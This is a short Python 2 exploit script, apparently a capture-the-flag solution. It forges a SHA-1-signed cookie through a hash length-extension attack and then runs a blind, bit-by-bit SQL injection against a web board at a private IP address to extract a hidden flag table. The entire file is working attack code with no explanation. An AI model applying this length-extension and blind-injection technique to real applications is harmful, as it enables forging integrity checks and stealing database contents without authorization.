from hashpumpy import hashpump
from requests import Session
from hashlib import sha1
from urllib import quote
from multiprocessing import Pool

key = "/*ID:jinmo123*/SELECT * FROM board where no="
original = "1#"
s = Session()
def run(args):
	j, i = args
	s.post('http://200.200.200.108/login_chk.php', data={'id': 'guest', 'pw': 'guest'})
	r = s.get("http://200.200.200.108/?p=read.php&no=" + quote(original))
	payload = "\n AND 0 OR (ord(reverse(lpad((SELECT LENGTH(F14G) FROM FlagPart1),%d,space(1))))&%d)" % (j + 1, 1 << i)
	digest = s.cookies['integrity']
	digest, message = hashpump(digest, original, payload, len(key))
	del s.cookies['integrity']
	s.cookies['integrity'] = digest

	r = s.get('http://200.200.200.108/?p=read.php&no=' + quote(message))
	result = 'do our best' in r.text
	del s.cookies['integrity']
	return result




if __name__ == '__main__':
	p = Pool(5)
	s = ''
	for j in range(20):
		result = p.map(run, [(j, i) for i in range(8)])
		r = 0
		for i in range(8):
			r |= result[i] << i
		print `chr(r)`
		s += chr(r)
	print s

